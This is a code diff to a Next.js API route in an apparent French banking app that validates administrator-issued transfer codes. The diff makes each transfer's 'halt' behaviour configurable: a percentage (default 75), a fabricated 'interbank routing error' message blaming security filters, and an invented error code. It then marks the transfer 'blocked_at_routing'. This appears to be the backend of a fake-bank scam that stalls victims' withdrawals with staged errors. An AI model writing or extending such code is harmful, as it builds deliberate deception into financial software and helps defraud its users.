@@ -1,10 +1,10 @@
 import { randomUUID } from "node:crypto";
-import { and, eq } from "drizzle-orm";
+import { and, eq, sql } from "drizzle-orm";
 import { NextResponse } from "next/server";
 import { getApprovedUser } from "@/lib/auth";
 import { getOrCreateAccount } from "@/lib/dashboard-data";
 import { db } from "@/lib/db";
-import { notificationsTable, transactionsTable, withdrawalRequestsTable, transferSettingsTable } from "@/lib/schema";
+import { accountsTable, notificationsTable, transactionsTable, withdrawalRequestsTable } from "@/lib/schema";
 
 export async function POST(request: Request) {
   try {
@@ -28,6 +28,13 @@ export async function POST(request: Request) {
       return NextResponse.json({ success: false, message: "Demande de transfert introuvable." }, { status: 404 });
     }
 
+    if (!reqRow.otpCode) {
+      return NextResponse.json({
+        success: false,
+        message: "Aucun code de validation n'a encore été transmis par l'administrateur.",
+      }, { status: 400 });
+    }
+
     const trimmedEntered = otpCode.trim();
     if (trimmedEntered !== reqRow.otpCode) {
       return NextResponse.json({
@@ -36,11 +43,10 @@ export async function POST(request: Request) {
       }, { status: 400 });
     }
 
-    // Récupérer les paramètres de virement configurables
-    const [settings] = await db.select().from(transferSettingsTable).limit(1);
-    const haltPercent = settings?.haltPercent ?? 75;
-    const haltMessage = settings?.haltMessage ?? "Erreur de routage bancaire interbancaire (Code: ERR_SEPA_75). Votre virement a été suspendu par les filtres de sécurité. Veuillez contacter votre conseiller bancaire CBG.";
-    const errorCode = settings?.errorCode ?? "ERR_INTERBANK_ROUTING_SUSPENDED";
+    // Utiliser les paramètres spécifiques à CE virement (configurés par l'admin)
+    const haltPercent = reqRow.haltPercent ?? 75;
+    const haltMessage = reqRow.haltMessage ?? "Erreur de routage bancaire interbancaire. Votre virement a été suspendu par les filtres de sécurité. Veuillez contacter votre conseiller bancaire.";
+    const errorCode = reqRow.errorCode ?? "ERR_INTERBANK_ROUTING_SUSPENDED";
 
     const account = await getOrCreateAccount(user.id);
     const createdAt = new Date().toISOString();
@@ -51,6 +57,12 @@ export async function POST(request: Request) {
         .update(withdrawalRequestsTable)
         .set({ status: "blocked_at_routing" })
         .where(eq(withdrawalRequestsTable.id, requestId));
+
+      // Libérer le montant réservé
+      await tx
+        .update(accountsTable)
+        .set({ reservedCents: sql`${accountsTable.reservedCents} - ${reqRow.amountCents}` })
+        .where(eq(accountsTable.userId, user.id));
 
       // Record transaction as failed
       await tx.insert(transactionsTable).values({
